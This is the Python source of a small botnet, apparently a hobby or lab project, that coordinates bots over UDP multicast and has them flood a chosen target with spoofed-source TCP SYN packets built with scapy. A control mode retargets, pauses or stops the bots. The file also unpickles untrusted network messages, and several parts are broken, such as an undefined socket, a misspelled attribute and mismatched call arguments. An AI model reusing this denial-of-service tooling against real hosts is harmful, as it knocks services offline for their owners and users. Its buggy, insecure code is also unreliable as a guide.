#Definitely not a botnet
import base64
from random import randint
import socket
import struct
import selectors
import time
import string
import pickle
import copy
import datetime
import sys

from scapy.all import *

BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits


def randInt():
	x = randint(1000,9000)
	return x	
    
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip
class zerg:
    def __init__(self, name: str = ""):

        # --Init Variables n stuff we'll need----
        self.sel = selectors.DefaultSelector()

        self.isControl =False if name !="admin" else True
        # Commands
        self.kill = False
        self.pause = False

        self.TARGET = "127.0.0.1"
        self.TARGETPORT=5000
        # --Things for communication with victim server (HTTP,TCP)---
        #self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.HOST = self.TARGET # "host.docker.internal"
        self.PORT = self.TARGETPORT

        # ---Things for communication with brood (Multicast via udp)--
        self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mCastSock.settimeout(0.2)
        self.MCAST_TTL = struct.pack('b', 1)
        self.MCAST_GRP ='224.3.29.71'  # what we put here
        self.MCAST_PORT = 10000

        self.mCastSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_address = ('', 10000)
        self.mCastSock.bind(server_address)
        group = socket.inet_aton(self.MCAST_GRP)
        mreq = struct.pack('4sL', group, socket.INADDR_ANY)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        # Listen for socket activity
        self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)

        self.peers = {}


        hostname = socket.gethostname()
        self.address = socket.gethostbyname(hostname)
        print("I AM:",self.address)


    def sayImHere(self):                           
        '''Send a imhere message'''  # General Kenobi
        msg = {
            'command': 'imhere',
        }
        encodedMSG = pickle.dumps(msg)
        
        # Send the ImHere message to peers (via Multicast)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayStop(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'stop',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def sayTarget(self,target :str):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'target',
            'target':target
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def sayPause(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'pause'
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
    
    def sayResume(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'resume',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
    def sendMCAST(self, msg):
        '''Send a message to our peers'''
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(msg, (self.MCAST_GRP, self.MCAST_PORT))
        while True:
            try:
                data, server = self.mcastSock.recvfrom(1024)
            except socket.timeout:
                break
            else:
                if server not in self.peers.keys():     # New peer, add them to our contact book
                    self.peers[server]=[-1,[0,0]]


    def recvMCAST(self):
        '''Receive messages from our peers (and process them)'''
        try:
            data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            return
        else:
            recvMSG = pickle.loads(data) 
            if server in self.peers:
                self.peers[server]=[time.time(),self.peers[server][1]] # last seen at: now
            else:
                self.peers[server]=[time.time(),[0,0]]  # New peer
            
            cmd = recvMSG['command']
            if cmd=='imhere':
                # Sort out stored ranges and verified pwds
                pass

               
            elif cmd=='stop':

                #print("# PASSWORDS TESTED:", arraySum(self.verified))
                exit(0) # Shutting down...
            elif cmd=='target':
                self.s.close()
                TARGET = recvMSG['target']
                TARGETPORT = recvMSG['port'] if recvMSG['port'] != "" else TARGETPORT
                self.HOST = self.TARGET # "host.docker.internal"
                self.PORT = self.TARGETPORT
                self.s.connect((self.HOST, self.PORT))


            elif cmd == "pause":
                self.pause = True
            elif cmd == "resume":
                self.pause = False
            return



    def attack(self):
        """Creates the AuthHeader with the created pw"""  
   
        s_port = randInt()
        s_eq = randInt()

        w_indow = randInt()   
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = self.TARGET 
        TCP_Packet = TCP()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = self.TARGETPORT
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        print("Sending...")
        send(IP_Packet/TCP_Packet, verbose=0)


    def send_msg(self, msg):
        """Sends ONE (1) message to VICTIM"""  
        encoded_msg = str(msg).encode("utf-8")
        self.s.send(encoded_msg)


    def controlLoop(self):

        try:
            while(True):
                print("Welcome to Definitely-A-Botnet")
                menu = """
                    Available instructions:
                    "stop" - stop the bots
                    "status" - view botnet status
                    "target" - change target
                    "pause" - pause attack
                    "resume" - resume attack 
                """
                print(menu)
                inp = input("\n> ")
                if(inp =="stop"):
                    self.sayStop()
                elif(inp=="status"):
                    print("Status Screen Goes here") #TODO status screen
                    print(f"bots: {len(self.peers.keys())}")
                elif(inp.contains("target")):
                    inp=inp.split()
                    print(f"DEBUG: {inp}")
                    siz = len(inp)
                    if siz <2:
                        print("Missing target!")
                        break
                    elif(siz==2):
                        self.sayTarget(inp[1] ,"")
                    elif(siz==3):
                        self.sayTarget(inp[1] ,inp[2])
                    else:
                        print("idk man")
                elif(inp=="pause"):
                    self.sayPause()
                elif(inp=="resume"):
                    self.sayResume()
                else:
                    print("/!\ Invalid Command!")
        except KeyboardInterrupt:
            print("Shutting Down... Want to stop bots? y/n")
            inp =input("> ")
            if inp=="y":
                self.sayStop()
            else:
                print("Goodbye")
                exit(0)

    def loop(self):
        '''Main Loop'''

        if self.isControl:
            self.controlLoop()
        else:
            while not self.kill:                                  
                #print("all your base are belong to us")         # nice ref :D

                if not self.pause:
                    for i in range(100):
                            self.attack()
                            time.sleep(0.5)

                for peer in self.peers.keys():
                    if self.peers[peer][0] < time.time() - 5 and time.time() - 15!=0 :
                        self.peers.pop(peer)
                        continue

                toDo = self.sel.select(0)
                for event, data in toDo:
                    callback = event.data
                    msg = callback()

if __name__=="__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "Brood1"
    slave=zerg(name)
    slave.loop()
